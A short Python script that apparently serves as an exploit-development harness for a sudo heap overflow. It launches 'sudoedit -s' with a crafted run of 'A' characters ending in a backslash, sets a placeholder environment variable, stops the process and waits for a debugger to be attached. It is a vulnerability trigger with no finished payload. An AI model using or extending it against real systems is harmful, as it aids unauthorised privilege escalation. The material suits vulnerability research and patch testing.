import subprocess, signal

cmd = ['sudoedit', '-s', 'A'*14 + '\\']
env = {'BBBBB': 'CCCCC'}

p = subprocess.Popen(cmd, env=env)
p.send_signal(signal.SIGSTOP)

input('[+] Attach GDB')
